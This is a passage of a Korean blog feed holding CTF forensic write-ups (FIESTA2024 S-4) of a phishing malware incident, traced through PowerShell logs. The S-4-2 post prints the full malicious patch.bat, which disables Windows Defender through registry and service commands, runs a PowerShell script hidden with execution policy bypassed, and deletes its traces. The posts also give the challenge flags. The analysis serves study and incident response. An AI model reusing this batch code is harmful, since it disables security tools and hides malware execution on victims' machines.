&lt;p&gt;처음부터 다시 한 번 동작을 짚어보겠다.&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;피해자는 악성 배치 파일을 실행했다.&lt;/li&gt;
  &lt;li&gt;실행된 악성 배치 파일은 함께 있던 악성 파일 powershell.ps1 파일을 실행했다.&lt;/li&gt;
  &lt;li&gt;powershell.ps1 파일은 함께 있던 Guide.idb 파일을 디코딩해 악성 커맨드를 뽑았고, 실행했다.&lt;/li&gt;
  &lt;li&gt;실행된 악성 커맨드는 원격지 서버에서 파일을 다운받고, 7-zip 유틸리티를 이용해 백그라운드로 압축 해제 및 실행하도록 했다.&lt;/li&gt;
  &lt;li&gt;그렇게 드롭된 system.ps1 파일은 class.ps1 파일을 실행했다.&lt;/li&gt;
  &lt;li&gt;class.ps1 파일은 리버스 쉘로, mpev.ps1을 피해자 컴퓨터에 write했다.&lt;/li&gt;
  &lt;li&gt;mpev.ps1 파일은 실행 시점에 상기 디렉토리에 있는 가장 큰 파일을 ftp 를 이용해 원격지 서버에 업로드했다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;파워쉘 스크립트가 핵심적으로 사용됐으므로 침해당한 컴퓨터의 PowerShell 로그를 확인할 것이다.&lt;/p&gt;

&lt;p&gt;3번~4번에서 넘어가는 시점에 파워쉘은 파이프라인 IO를 활용해 커맨드를 실행했을 것이다.&lt;/p&gt;

&lt;p&gt;즉, 800번 이벤트가 반드시 발생했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이벤트 ID 순으로 파워쉘 로그를 정렬해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%203.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;24.08.10 오후 5:12:49&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;7번의 행위는 반드시 저 시점 이후에 발생한다.&lt;/p&gt;

&lt;p&gt;따라서, 저 시점을 기준으로 mpev.ps1 문자열을 포함하는 이벤트를 전부 검색했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%204.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(위 사진은 찾을 내용 다 찾아봤을 때, 저 시점이 mpev.ps1의 가장 최초 실행 시점임을 뜻한다)&lt;/p&gt;

&lt;p&gt;그 결과, 아래와 같이 정리할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;이벤트 ID 403, 파워쉘 중지(powershell.ps1과 mpev.ps1), 24.08.10 오후 5:19:33&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%205.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%206.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이벤트 ID 600, 파워쉘 코드 실행(mpev.ps1), 24.08.10 오후 5:19:32&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%207.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, &lt;mark&gt;24.08.10 오후 5:19:33 이전에 해당 디렉토리에 있던 파일 중 가장 큰 것이 유출되었다&lt;/mark&gt;는 결론이 나온다.&lt;/p&gt;

&lt;p&gt;해당 디렉토리에 있던 파일을 추출해서 크기 내림차순으로 정렬 후 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%208.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;pdoc.png 파일이 조건에 부합하는 파일 중 가장 큰 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;해당 파일의 MD5SUM 값을 CyberChef로 구해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%209.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 플래그는 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIESTA{75C1AB24F0B76C54AA76F464F66E72CA}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 28 Jan 2025 09:00:02 -0600</pubDate>
        <link>https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S-4-2 풀이</title>
        <description>
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;문제&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;피해자가 다운로드 받은 파일명과 hidden 형식으로 실행된 파일은?
(flag 형식 : 다운받은 파일-실행된 파일)&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 실력이 부족해서 첫번째 문제를 못 푼거고&lt;/p&gt;

&lt;p&gt;그래서 뒤 문제도 다 못푼 건 맞는데&lt;/p&gt;

&lt;p&gt;아니 생각하면 생각할수록 (실체없이) 억울하네&lt;/p&gt;

&lt;p&gt;진짜로 1번 문제 정답 빼고 털 수 있는 건 다 털어서 더 억울함&lt;/p&gt;

&lt;p&gt;박탈감….아아…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 ‘피해자가’ 다운로드 받은 파일명과 그 파일을 실행함으로써 hidden 형식으로 실행된 파일을 묻는 것이며, 따라서 (시나리오의 설명을 참고하면) 어떤 메일을 열어서 무엇이 실행되었는지 찾아야 하는 문제로 보인다.&lt;/p&gt;

&lt;p&gt;그리고 그거 이미 S-4-1에서 풀었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/7ca383b9-13a9-41e0-9991-844913e93b3b.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/image.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;피해자는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patch_guide.zip&lt;/code&gt; 파일을 다운받았다.&lt;/p&gt;

&lt;p&gt;해당 파일 내부에는 아래와 같은 파일이 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/image.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/image.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;patch.bat 파일의 내용은 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nul&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorLevel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;neq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;requires&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;administrative&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;privileges.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Please&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;an&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;administrator.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/b&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DisableAntiSpyware&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;REG_DWORD&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DisableRealtimeMonitoring&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;REG_DWORD&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Patch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinDefend&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Patch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading.........&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinDefend&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading...............&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring,DisableAntiSpyware&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Patch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading.....................&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;~dp0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoProfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WindowStyle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%~dp0powershell.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;downloadPath=%USERPROFILE%\Downloads&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exist&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;del&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exist&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/s&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/q&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;맨 밑에 Hidden 형식으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell.ps1&lt;/code&gt;이 실행된 게 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 플래그는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIESTA{patch_guide.zip-powershell.ps1}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 28 Jan 2025 09:00:01 -0600</pubDate>
        <link>https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S-4-1 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-접근&quot; id=&quot;markdown-toc-0-접근&quot;&gt;0. 접근&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-악성-파일-분석&quot; id=&quot;markdown-toc-1-악성-파일-분석&quot;&gt;1. 악성 파일 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-쉘-스크립트-난독화-기법&quot; id=&quot;markdown-toc-2-쉘-스크립트-난독화-기법&quot;&gt;2. 쉘 스크립트 난독화 기법&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-악성코드는-왜-쉘스크립트를-사용할까&quot; id=&quot;markdown-toc-21-악성코드는-왜-쉘스크립트를-사용할까&quot;&gt;2.1. 악성코드는 왜 쉘스크립트를 사용할까?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-악성코드가-쉘스크립트를-사용할-때의-동작-단계-구성&quot; id=&quot;markdown-toc-22-악성코드가-쉘스크립트를-사용할-때의-동작-단계-구성&quot;&gt;2.2. 악성코드가 쉘스크립트를 사용할 때의 동작 단계 구성&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-쉘-스크립트-난독화-파훼&quot; id=&quot;markdown-toc-23-쉘-스크립트-난독화-파훼&quot;&gt;2.3. 쉘 스크립트 난독화 파훼&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#231-powershell-로깅-설정&quot; id=&quot;markdown-toc-231-powershell-로깅-설정&quot;&gt;2.3.1. PowerShell 로깅 설정&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#232-powershell-로깅-설정-변경&quot; id=&quot;markdown-toc-232-powershell-로깅-설정-변경&quot;&gt;2.3.2. PowerShell 로깅 설정 변경&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#233-sysmon을-활용한-백그라운드-동작-탐지&quot; id=&quot;markdown-toc-233-sysmon을-활용한-백그라운드-동작-탐지&quot;&gt;2.3.3. Sysmon을 활용한 백그라운드 동작 탐지&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-분석&quot; id=&quot;markdown-toc-3-분석&quot;&gt;3. 분석&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;!-- &lt;div class=&quot;notice--primary&quot;&gt; --&gt;

&lt;p&gt;&lt;strong&gt;이 문제를 풀지 못했던 이유와 주요 학습 사항&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;실제로 다운로드받는 파일의 일부만을 복호화해 사용한다면, 나머지 부분에 대해서도 의심했어야 한다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;이런 의심은 추후 실무상의 어떤 케이스에서 도움이 될 수 있는가?&lt;/p&gt;

        &lt;p&gt;→ 이건 실무상의 도움이라기보다는 문제에서 ‘쉘스크립트를 제대로 이해할 수 있는지’ 여부를 판단하기 위한 조건이었던 것 같음.&lt;/p&gt;

        &lt;p&gt;→ 따라서 문제 풀이를 위한 스킬인 것으로 보임… 잘 기억해둘 것.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
